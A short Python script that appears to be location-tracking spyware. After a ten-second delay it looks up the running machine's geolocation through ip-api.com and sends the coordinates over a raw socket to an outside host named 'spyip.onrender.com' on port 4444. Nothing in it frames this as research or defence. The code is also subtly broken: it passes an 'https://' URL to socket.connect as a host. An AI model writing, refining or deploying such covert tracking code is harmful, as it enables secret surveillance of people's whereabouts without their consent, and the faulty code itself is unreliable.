import socket
import requests
import time

def get_location():
    try:
        response = requests.get('http://ip-api.com/json/')
        data = response.json()
        return data['lat'], data['lon']
    except:
        return None, None

def send_location():
    host = 'https://spyip.onrender.com'
    port = 4444
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    lat, lon = get_location()
    if lat and lon:
        location = f"Location: {lat}, {lon}"
        s.send(location.encode())
    s.close()

if __name__ == "__main__":
    time.sleep(10)  # Wait a bit before executing
    send_location()
